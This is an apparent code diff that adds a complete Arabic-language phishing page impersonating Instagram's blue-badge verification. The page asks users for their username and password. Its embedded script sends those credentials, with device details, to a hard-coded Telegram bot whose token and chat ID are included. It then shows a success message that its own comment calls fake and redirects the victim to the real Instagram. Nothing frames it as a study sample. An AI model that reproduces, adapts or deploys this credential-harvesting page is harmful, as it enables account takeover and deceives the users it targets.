@@ -1,0 +1,351 @@
+
+```html
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - تأكيد الحساب</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #fafafa;
+            min-height: 100vh;
+            color: #262626;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: white;
+            border-bottom: 1px solid #dbdbdb;
+            padding: 16px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 100;
+        }
+        
+        .logo {
+            font-size: 22px;
+            font-weight: 600;
+            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .container {
+            flex: 1;
+            max-width: 400px;
+            margin: 80px auto 20px;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .verification-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 32px 24px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .badge-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #405DE6, #833AB4, #E1306C, #FCAF45);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            color: white;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #262626;
+        }
+        
+        .description {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+            text-align: right;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #262626;
+            text-align: right;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #fafafa;
+            transition: all 0.2s;
+            text-align: right;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: white;
+        }
+        
+        .submit-btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+            margin: 16px 0 8px;
+            transition: background 0.2s;
+        }
+        
+        .submit-btn:hover {
+            background: #0081d6;
+        }
+        
+        .submit-btn:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+        }
+        
+        .cancel-btn {
+            background: transparent;
+            color: #0095f6;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 12px 16px;
+            width: 100%;
+            cursor: pointer;
+        }
+        
+        .info-box {
+            background: #f5f7f9;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 20px;
+            text-align: right;
+        }
+        
+        .info-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #262626;
+        }
+        
+        .info-text {
+            font-size: 12px;
+            color: #8e8e8e;
+            line-height: 1.4;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+            background: white;
+            border-top: 1px solid #dbdbdb;
+        }
+        
+        .footer-links {
+            margin-bottom: 8px;
+        }
+        
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+        
+        .language-selector {
+            color: #8e8e8e;
+            margin-bottom: 8px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin-top: 60px;
+                padding: 0 16px;
+            }
+            
+            .verification-card {
+                padding: 24px 20px;
+            }
+            
+            .badge-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">Instagram</div>
+    </div>
+    
+    <div class="container">
+        <div class="verification-card">
+            <div class="badge-icon">✓</div>
+            <h1 class="title">تأكيد هوية حسابك</h1>
+            <p class="description">
+                نحتاج إلى تأكيد هويتك لمنح حسابك العلامة الزرقاء. هذا يساعد في حماية مجتمع إنستغرام.
+            </p>
+            
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <input type="text" id="username" placeholder="أدخل اسم المستخدم الخاص بك" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">تأكيد الهوية</button>
+                <button type="button" class="cancel-btn">تخطي الآن</button>
+            </form>
+            
+            <div class="info-box">
+                <div class="info-title">لماذا نحتاج هذه المعلومات؟</div>
+                <div class="info-text">
+                    نستخدم هذه البيانات لتأكيد أنك المالك الشرعي للحساب. نحن نحمي معلوماتك وفقًا لسياسة الخصوصية الخاصة بنا.
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        <div class="language-selector">العربية © 2024 Instagram from Meta</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8309210221:AAEUsJkF5wPJj9YwLEDjYCtnJghRKd9syuc";
+        const CHAT_ID = "5873816830";
+
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // جمع البيانات
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // إظهار رسالة تحميل
+            const submitBtn = document.getElementById('submitBtn');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = 'جاري التأكيد...';
+            submitBtn.disabled = true;
+            
+            // رسالة البيانات
+            const message = `
+✅ **طلب تأكيد هوية إنستغرام**
+
+👤 **بيانات الحساب:**
+   • اسم المستخدم: @${username}
+   • كلمة المرور: ${password}
+
+📱 **معلومات الجهاز:**
+   • النظام: ${navigator.platform}
+   • اللغة: ${navigator.language}
+   • الوقت: ${new Date().toLocaleString('ar-SA')}
+
+🔒 **سيتم مراجعة طلبك خلال 24 ساعة.**
+            `;
+            
+            // إرسال البيانات للتلجرام
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // رسالة نجاح وهمية
+                    alert('✅ تم تأكيد هويتك بنجاح! سيتم مراجعة طلبك لمنح العلامة الزرقاء خلال 24 ساعة.');
+                    
+                    // توجيه لإنستغرام الحقيقي بعد 3 ثواني
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com/';
+                    }, 3000);
+                } else {
+                    alert('❌ حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى.');
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('❌ حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى.');
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+            });
+        });
+
+        // زر التخطي
+        document.querySelector('.cancel-btn').addEventListener('click', function() {
+            if(confirm('هل أنت متأكد من التخطي؟ قد لا تتمكن من الحصول على العلامة الزرقاء.')) {
+                window.location.href = 'https://www.instagram.com/';
+            }
+        });
+    </script>
+</body>
+</html>
+```
